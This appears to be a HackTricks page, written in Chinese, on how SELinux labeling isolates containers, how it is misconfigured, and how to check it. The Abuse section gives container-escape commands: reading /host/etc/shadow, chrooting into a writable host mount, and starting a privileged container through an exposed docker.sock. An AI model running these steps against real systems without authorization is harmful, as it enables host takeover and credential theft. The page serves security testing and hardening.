# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## AppArmor Vs SELinux

最直观的高层次区别是，AppArmor 基于路径，而 SELinux 基于**标签**。这会对 container security 产生重大影响。如果相同的 host content 通过意外的 mount path 变得可见，基于路径的 policy 可能会表现不同。而基于标签的 policy 会检查对象的标签，以及 process domain 可以对其执行的操作。虽然这并不会让 SELinux 变得简单，但它确实能抵御一类基于路径技巧假设的攻击，而 defenders 在基于 AppArmor 的系统中有时会意外地依赖这些假设。

由于该模型以标签为核心，container volume 的处理和 relabeling 决策对 security 至关重要。如果 runtime 或 operator 为了“让 mounts 正常工作”而过于宽泛地更改标签，那么原本用于隔离 workload 的 policy boundary 可能会变得比预期弱得多。

## Lab

要确认 host 上是否启用了 SELinux：
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
要检查主机上现有的标签：
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
要比较正常运行与禁用标记的运行：
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
在启用 SELinux 的主机上，这是一个非常实用的演示，因为它展示了在预期的 container domain 下运行的 workload，与被移除该 enforcement layer 的 workload 之间的差异。

## Runtime 使用

在 SELinux 属于平台默认组件的系统上，Podman 与 SELinux 的配合尤其紧密。Rootless Podman 加上 SELinux 是主流 container baseline 中最强的一类，因为该进程在主机侧本身就是 unprivileged 的，同时仍受到 MAC policy 的约束。在受支持的环境中，Docker 也可以使用 SELinux，不过管理员有时会为了绕过 volume-labeling 带来的问题而将其禁用。CRI-O 和 OpenShift 高度依赖 SELinux，将其作为 container isolation 机制的一部分。Kubernetes 也可以提供与 SELinux 相关的设置，但这些设置的价值显然取决于 node OS 是否实际支持并强制执行 SELinux。<sup>[[2]](#references)</sup>

反复得到的教训是，SELinux 并不是可有可无的装饰。在围绕它构建的生态系统中，它属于预期 security boundary 的一部分。

## Misconfigurations

最经典的错误是 `label=disable`。在实际运维中，这通常是因为某个 volume mount 被拒绝，而最快的短期解决方案是移除 SELinux 的影响，而不是修复 labeling model。<sup>[[1]](#references)</sup> 另一个常见错误是对 host content 进行错误的 relabeling。宽泛的 relabel 操作可能会让应用正常工作，但也可能使 container 能够访问的内容远远超出最初的预期。

同样重要的是，不要混淆 **已安装的** SELinux 与 **有效运行的** SELinux。主机可能支持 SELinux，但仍处于 permissive mode；或者 runtime 可能没有在预期的 domain 下启动 workload。在这些情况下，实际保护强度会远低于文档所暗示的程度。

## Abuse

当 SELinux 不存在、处于 permissive 状态，或对 workload 被广泛禁用时，host-mounted paths 会更容易被滥用。原本会受到 labels 约束的 bind mount，可能变成直接访问 host data 或修改 host 的途径。当这种情况与 writable volume mounts、container runtime directories，或为方便而暴露敏感 host paths 的运维捷径结合时，风险尤其明显。

SELinux 经常可以解释：为什么某个通用 breakout writeup 在一台主机上立即生效，却在另一台主机上反复失败，即使两者的 runtime flags 看起来相似。缺失的因素往往根本不是 namespace 或 capability，而是仍然保持完整的 label boundary。

最快的实际检查方法是比较 active context，然后探测通常会受到 label 约束的 mounted host paths 或 runtime directories：
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
如果存在主机 bind mount，且 SELinux labeling 已被禁用或弱化，通常首先会发生信息泄露：
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
如果 mount 可写，并且从 kernel 的视角来看，container 实际上具有 host-root 权限，下一步应测试受控的 host 修改，而不是进行猜测：
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
在支持 SELinux 的主机上，runtime state 目录附近的 labels 丢失也可能暴露出直接的 privilege-escalation 路径：
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
这些命令不能替代完整的 escape chain，但它们可以非常快速地确认：究竟是不是 SELinux 阻止了 host data access 或 host-side file modification。

### 完整示例：SELinux Disabled + Writable Host Mount

如果 SELinux labeling 被禁用，并且 host filesystem 以 writable 方式挂载到 `/host`，那么完整的 host escape 就会变成普通的 bind-mount abuse case：
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
如果 `chroot` 成功，容器进程现在将从主机文件系统中运行：
```bash
id
hostname
cat /etc/passwd | tail
```
### 完整示例：SELinux 已禁用 + Runtime 目录

如果 workload 在禁用 labels 后能够访问 Runtime socket，则可以将 escape 交给 Runtime：
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
相关观察是，SELinux 通常正是阻止此类 host-path 或 runtime-state 访问的控制机制。

## 检查

SELinux 检查的目标是确认 SELinux 已启用，识别当前的 security context，并查看你关注的文件或路径是否确实受到标签限制。
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
这里有什么值得关注：

- `getenforce` 理想情况下应返回 `Enforcing`；`Permissive` 或 `Disabled` 会改变整个 SELinux 部分的含义。
- 如果当前进程上下文看起来异常或权限范围过宽，则该 workload 可能没有运行在预期的 container policy 下。
- 如果进程可以过度自由地访问 host-mounted 文件或 runtime 目录的 labels，则 bind mounts 会变得更加危险。

在支持 SELinux 的平台上审查 container 时，不要把 labeling 当作次要细节。在许多情况下，它是 host 尚未被 compromise 的主要原因之一。

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Host-dependent | SELinux separation is available on SELinux-enabled hosts, but the exact behavior depends on host/daemon configuration | `--security-opt label=disable`, broad relabeling of bind mounts, `--privileged` |
| Podman | Commonly enabled on SELinux hosts | SELinux separation is a normal part of Podman on SELinux systems unless disabled | `--security-opt label=disable`, `label=false` in `containers.conf`, `--privileged` |
| Kubernetes | Not generally assigned automatically at Pod level | SELinux support exists, but Pods usually need `securityContext.seLinuxOptions` or platform-specific defaults; runtime and node support are required | weak or broad `seLinuxOptions`, running on permissive/disabled nodes, platform policies that disable labeling |
| CRI-O / OpenShift style deployments | Commonly relied on heavily | SELinux is often a core part of the node isolation model in these environments | custom policies that over-broaden access, disabling labeling for compatibility |

SELinux defaults are more distribution-dependent than seccomp defaults. On Fedora/RHEL/OpenShift-style systems, SELinux is often central to the isolation model. On non-SELinux systems, it is simply absent.

## References

- [1] [Podman Documentation: --security-opt=option (label=disable)](https://docs.podman.io/en/v4.6.0/markdown/options/security-opt.html)
- [2] [Kubernetes: Configure a Security Context for a Pod or Container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

{{#include ../../../../banners/hacktricks-training.md}}
